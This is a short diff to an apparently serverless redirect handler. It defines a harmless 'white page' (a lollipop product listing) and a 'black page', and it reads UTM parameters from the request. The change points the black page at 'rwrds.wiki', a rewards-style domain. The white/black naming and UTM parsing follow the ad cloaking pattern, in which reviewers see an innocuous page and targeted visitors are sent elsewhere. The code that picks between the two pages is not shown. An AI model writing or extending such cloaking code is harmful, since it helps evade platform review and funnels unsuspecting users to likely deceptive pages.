@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.japanla.com/products/tasty-peach-neon-lollipop-nomwhal";
-    const blackPageURL = "https://beacons.ai/allyhauls";
+    const blackPageURL = "https://rwrds.wiki";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
